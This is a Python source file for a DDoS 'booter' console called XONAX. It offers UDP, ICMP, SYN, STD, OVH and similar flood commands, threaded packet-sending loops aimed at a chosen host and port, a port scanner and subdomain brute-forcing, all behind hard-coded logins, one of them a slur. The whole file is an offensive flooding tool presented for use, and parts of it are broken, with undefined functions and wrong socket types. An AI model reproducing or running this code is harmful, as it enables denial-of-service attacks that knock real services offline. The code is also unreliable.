#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;C O R T E X |CORT| D O W N E D\x07")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mDDoS METHODS\033[91m                     ║               
║══════════════════════════════════════════════════════════║
║ \033[00mUDP     <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m UDP  ATTACK\033[91m   ║
║ \033[00mICMP    <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP ATTACK\033[91m   ║
║ \033[00mSYN     <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m SYN  ATTACK\033[91m   ║
║ \033[00mSTD     <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m |\033[00m STD  ATTACK\033[91m   ║
║ \033[00mHTTP    <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m HTTP ATTACK\033[91m   ║
║ \033[00mOVH     <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m OVH  ATTACK\033[91m   ║ 
║ \033[00mSTDHEX  <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m STDHEX ATTACK\033[91m ║ 
║ \033[00mICMP    <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP  ATTACK\033[91m  ║ 
║ \033[00mUDPLAIN <HOST> <PORT> <TIMEOUT> <SIZE>  \033[91m|\033[00m ICMP  ATTACK\033[91m  ║ 
╚══════════════════════════════════════════════════════════╝\033[00m
"""

info = """
[\033[91mXONAX\033[00m] \033[91mXONAX. Made by XonaX
i liked this scripts, so i simply re coded it,
i will be adding new methods all the time,
stay tuned. 
XONAX.s Biggest Attack
31.9 gbps
Cortexs, Biggest Attack,
Not Recorded, (Most Likely The Same As XONAX.)
"""

version = "3.2"

help = """\033[91m
╔══════════════════════════════════════════════════════╗
║                    \033[00mBASIC COMMANDS\033[91m                    ║
║══════════════════════════════════════════════════════║
║ \033[00mClear                         \033[91m|\033[00m CLEAR SCREEN\033[91m         ║
║ \033[00mExit                          \033[91m|\033[00m EXIT XONAX\033[91m         ║
║ \033[00mMethods                       \033[91m|\033[00m XONAXS METHODS\033[91m         ║
║ \033[00mTools                         \033[91m|\033[00m BASIC TOOLS\033[91m          ║
║ \033[00mUpdates                       \033[91m|\033[00m DISPLAY UPDATE NOTES\033[91m ║
║ \033[00mInfo                          \033[91m|\033[00m DISPLAY XONAX.S INFO\033[91m║
╚══════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \033[00mTOOLS\033[91m                         ║
║══════════════════════════════════════════════════════║
║ \033[00mStopattacks                   \033[91m|\033[00m STOP ALL ATTACKS\033[91m     ║
║ \033[00mAttacks                       \033[91m|\033[00m RUNNING ATTACKS\033[91m      ║
║ \033[00mPing <HOST>                   \033[91m|\033[00m PING A HOST\033[91m          ║
║ \033[00mResolve <HOST>                \033[91m|\033[00m GRAB A DOMIANS IP\033[91m    ║
║ \033[00mPortscan <HOST> <RANGE>       \033[91m|\033[00m PORTSCAN A HOST  \033[91m    ║
║ \033[00mDnsresolve <HOST>             \033[91m|\033[00m GRAB ALL SUB-DOMAINS\033[91m ║
║ \033[00mStats                         \033[91m|\033[00m DISPLAY XONAX. STATS\033[91m║
╚══════════════════════════════════════════════════════╝\033[00m
"""

updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUPDATE NOTES\033[91m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m- Better ascii menu\033[91m                                  ║
║ \033[00m- Updated command caXONAXg no longer only capital\033[91m      ║
║ \033[00m- Updated attack methods\033[91m                             ║
║ \033[00m- Timeout bug fixed\033[91m                                  ║
║ \033[00m- Background attacks\033[91m                                 ║
║ \033[00m- Running task displayer\033[91m                             ║
║ \033[00m- All tools fixed and working\033[91m                        ║
║ \033[00m- Fixed HTTP & SYN Methods All Methods Working\033[91m       ║ 
║ \033[00m- Deleted HTTP & Added STD, STD Is Working & Tested\033[91m  ║
╚══════════════════════════════════════════════════════╝\033[00m

"""
statz = """

║              \033[00mSTATS\033[91m                     ║

\033[00m- Attacks: \033[91m{}                                        
\033[00m- Found Domains: \033[91m{}                                  
\033[00m- PINGS: \033[91m{}                                          
\033[00m- PORTSCANS: \033[91m{}                                      
\033[00m- GRABBED IPS: \033[91m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[1;00m

▒██   ██▒ ▒█████   ███▄    █  ▄▄▄      ▒██   ██▒
▒▒ █ █ ▒░▒██▒  ██▒ ██ ▀█   █ ▒████▄    ▒▒ █ █ ▒░
░░  █   ░▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄  ░░  █   ░
 ░ █ █ ▒ ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██  ░ █ █ ▒ 
▒██▒ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒▒██▒ ▒██▒
▒▒ ░ ░▓ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▒ ░ ░▓ ░
░░   ░▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░░░   ░▒ ░
 ░    ░  ░ ░ ░ ▒     ░   ░ ░   ░   ▒    ░    ░  
 ░    ░      ░ ░           ░       ░  ░ ░    ░  
                       \033[1;91m罪 深 い\033[00m
"""

altbanner = """
			     Angels go to heaven
			   Demons meet the gates of hell
		      XonaX people are punished put in hell
		     XONAXners Meet The Cortex And Fall Into The Vortex
		      		       	X O N A X 
"""

cookie = open(".XONAX._cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
std = True



def synsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global std

	while True:
		sys.stdout.write("\x1b]2;X O N A X\x07")
		XONAX = input("\033[1;00m[\033[91mXONAX.\033[1;00m]-\033[91m家\033[00m ").lower()
		XONAXput = XONAX.split(" ")[0]
		if XONAXput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif XONAXput == "help":
			print (help)
			main()
		elif XONAXput == "":
			main()
		elif XONAXput == "exit":
			exit()
		elif XONAXput == "version":
			print ("XONAXful version: "+version+" ")
		elif XONAXput == "stats":
			print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
			print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
			main()
		elif XONAXput == "methods":
			print (method)
			main()
		elif XONAXput == "tools":
			print (tools)
			main()
		elif XONAXput == "portscan":
			port_range = int(XONAX.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mXONAX\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(XONAX.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif XONAXput == "updates":
			print (updatenotes)
			main()
		elif XONAXput == "info":
			print (info)
			main()
		elif XONAXput == "attacks":
			print ("\n[\033[91mXONAX\033[00m] UPD Running processes: {}".format (uaid))
			print ("[\033[91mXONAX\033[00m] ICMP Running processes: {}".format (iaid))
			print ("[\033[91mXONAX\033[00m] SYN Running processes: {}".format (said))
			print ("[\033[91mXONAX\033[00m] STD Running Processes: {}".format (said))
			print ("[\033[91mXONAX\033[00m] Total attacks running: {}\n".format (aid))
			main()
		elif XONAXput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;X O N A X |{}| F O U N D\x07".format (sfound))
			try:
				host = XONAX.split(" ")[1]
				with open(r"/usr/share/XONAX./subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[91mXONAX\033[00m] Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;X O N A X |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\033[91mXONAX\033[00m] Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("[\033[91mXONAX\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif XONAXput == "resolve":
			liips += 1
			host = XONAX.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mXONAX\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif XONAXput == "ping":
			tpings += 1
			try:
				XONAXput, host, port = XONAX.split(" ")
				print ("[\033[91mXONAX\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mXONAX\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;X O N A X |{}ms| D E M O N S\x07".format (stop))
						print ("XONAX.: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;X O N A X |TIME OUT| D E M O N S\x07")
						print ("XONAX.: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mXONAX\033[00m] The command {} requires an argument".format (XONAXput))
				main()
		elif XONAXput == "udp":
			if username == "guests":
				print ("[\033[91mXONAX\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					XONAXput, host, port, timer, pack = XONAX.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mXONAX\033[00m] The command {} requires an argument".format (XONAXput))
					main()
				except socket.gaierror:
					print ("[\033[91mXONAX\033[00m] Host: {} invalid".format (host))
					main()
		elif XONAXput == "std":
			try:
				XONAXput, host, port, timer, pack = XONAX.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mXONAX\033[00m] The command {} requires an argument".format (XONAXput))
				main()
			except socket.gaierror:
				print ("[\033[91mXONAX\033[00m] Host: {} invalid".format (host))
				main()
		elif XONAXput == "udplain":
			if username == "guests":
				print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] You Are Not Allowed To Use This Method.")
				main()
		elif XONAXput == ".stdhex":
			try:
				XONAXput, host, dport, timer, pack = XONAX.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] The Command {} Requires An Argument.".format (XONAXput))
				main()
			except socket.gaierror:
				print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] Host: {} Invalid".format (host))
				main()
			else:
				try:
					XONAXput, host, dport, timer, pack = XONAX.split(" ")
					socket.gethostbyname(host)
					print ("⌐╦╦═─: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=ovhsender, args=(host, dport, timer, punch)).start()
				except ValueError:
					print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] The Command {} Requires An Argument.".format (XONAXput))
					main()
				except socket.gaierror:
					print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] Host: {} Invalid".format (host))
					main()
		elif XONAXput == "ovh":
			if username == "guests":
				print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] You Are Not Allowed To Use This Method.")
				main()
			try:
				XONAXput, host, dport, timer, pack = XONAX.split(" ")
				socket.gethostbyname(host)
				print ("⌐╦╦═─: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdhexsender, args=(host, dport, timer, punch)).start()
			except ValueError:
				print ("[\x1b[1;31m XONAX\x1b[1;31mXONAX\033[01;97m] The Command {} Requires An Argument.".format (XONAXput))
				main()
		elif XONAXput == "icmp":
			if username == "guests":
				print ("[\033[91mXONAX\033[00m] You are not allowed to use this method")
				main()
			else:
				try:
					XONAXput, host, port, timer, pack = XONAX.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mXONAX\033[00m] The command {} requires an argument".format (XONAXput))
					main()
				except socket.gaierror:
					print ("[\033[91mXONAX\033[00m] Host: {} invalid".format (host))
					main()
		elif XONAXput == "syn":
			try:
				XONAXput, host, port, timer, pack = XONAX.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mXONAX\033[00m] The command {} requires an argument".format (XONAXput))
				main()
			except socket.gaierror:
				print ("[\033[91mXONAX\033[00m] Host: {} invalid".format (host))
				main()
		elif XONAXput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif XONAXput == "stop":
			what = XONAX.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mXONAX\033[00m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mXONAX\033[00m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\033[91mXONAX\033[00m] {} Not a command".format(XONAXput))
			main()



try:
	users = ["root", "guests", "me"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman", "me"]
	password = getpass.getpass ("[+] Password: ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mXONAX\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mXONAX\033[00m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()